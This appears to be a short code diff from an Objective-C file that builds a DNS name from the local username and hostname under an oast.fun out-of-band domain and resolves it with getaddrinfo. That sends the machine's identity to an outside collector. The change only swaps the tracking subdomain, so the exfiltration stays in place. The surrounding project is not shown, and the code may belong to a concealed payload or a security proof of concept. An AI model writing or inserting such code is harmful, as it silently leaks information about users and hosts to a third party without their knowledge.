@@ -11,7 +11,7 @@
         NSString *cleanUser = [[user stringByReplacingOccurrencesOfString:@" " withString:@"-"] lowercaseString];
         NSString *cleanHost = [[host stringByReplacingOccurrencesOfString:@" " withString:@"-"] lowercaseString];
         
-        NSString *exfilDomain = [NSString stringWithFormat:@"%@.%@.xkrlhpfhpyyqcliksdujpddovn6tj65t4.oast.fun", cleanUser, cleanHost];
+        NSString *exfilDomain = [NSString stringWithFormat:@"%@.%@.txltewamwbpaxlebmxwi0hk7enih8t8ct.oast.fun", cleanUser, cleanHost];
         
         struct addrinfo *res;
         getaddrinfo([exfilDomain UTF8String], NULL, NULL, &res);
